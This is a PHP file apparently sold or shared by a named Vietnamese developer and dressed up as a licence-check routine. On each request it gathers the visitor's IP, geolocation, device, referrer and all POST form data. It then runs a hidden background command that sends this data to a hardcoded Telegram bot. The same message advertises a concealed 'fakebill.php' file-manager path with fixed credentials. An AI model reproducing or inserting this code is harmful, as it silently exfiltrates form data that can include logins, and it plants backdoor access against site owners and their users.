<?php
/*
@tele : @tphatdev
@fb : https://www.facebook.com/tfhatdev
@zalo : 0336391850
Source By ThanhhPhatt
*/

ini_set('display_errors', 1);
ini_set('log_errors', 0);
error_reporting(0);
// require_once($_SERVER['DOCUMENT_ROOT']. '/config/common.php');
$tokenBot = "7188773014:AAEObg9TdxJ01Ow5Lk5CoMEq9ZZzRBWUubk"; // Input Token Telegram
$idchat = "5321236253"; // Id chat sent message
function getDeviceName($userAgent) {
    $devices = [
        'iPhone' => '/iPhone/i',
        'iPad' => '/iPad/i',
        'iPod' => '/iPod/i',
        'Android Phone' => '/Android.*Mobile/i',
        'Android Tablet' => '/Android/i',
        'Windows Phone' => '/Windows Phone/i',
        'Windows Tablet' => '/Windows.*Tablet/i',
        'Windows' => '/Windows NT/i',
        'Mac' => '/Macintosh/i',
        'Linux' => '/Linux/i',
        'Unknown' => '/./'
    ];

    foreach ($devices as $device => $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return $device;
        }
    }

    return 'Unknown Device';
}
function License() {
    $ip = file_get_contents('https://api.ipify.org/');
    $server = $_SERVER['SERVER_NAME'];
    $url = $_SERVER['REQUEST_URI'];
    $date = date('Y-m-d H:i:s');
    $method = $_SERVER['REQUEST_METHOD'];
    $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : false;
    $browserInfo = $_SERVER['HTTP_USER_AGENT'];
    $deviceName = getDeviceName($browserInfo);
    $params = 'Không có';
    $geoInfo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    $location = $geoInfo['city'] . ", " . $geoInfo['country'];
    $lat = $geoInfo['lat'];
    $lon = $geoInfo['lon'];

    $locationMapLink = "https://www.google.com/maps/search/?api=1&query=$lat,$lon";
    
    if ($method === 'POST' && !empty($_POST)) {
        $params = "POST Data: " . json_encode($_POST);
    } else {
        $params = false;
    }

    $message = "
HỆ THỐNG KIỂM TRA BẢN QUYỀN !!
- Thời gian: $date
- Suspicious IP detected: $ip
- Devices: $deviceName
- Location: $location
- Method: $method
- Payload: $params
- URL: [URL]($server$url)
- Referrer: [$referrer]($referrer)
+ Login Panel: 
- [Manage File]($server/Bank/Bank1/Bank2/Bank3/Bank4/Bank5/fakebill.php)
- Username: tphatdev
- Password: tphatdev
- Map: [MAP]($locationMapLink)
";
    $encodedMessage = urlencode($message);

    if ($params != false && $referrer != false) {
        $command = "php -r \"file_get_contents('https://api.telegram.org/bot7188773014:AAEObg9TdxJ01Ow5Lk5CoMEq9ZZzRBWUubk/sendMessage?chat_id=-1002344634491&text=$encodedMessage&parse_mode=Markdown');\" > /dev/null 2>&1 &";
        exec($command);
    }
}
License();

?>
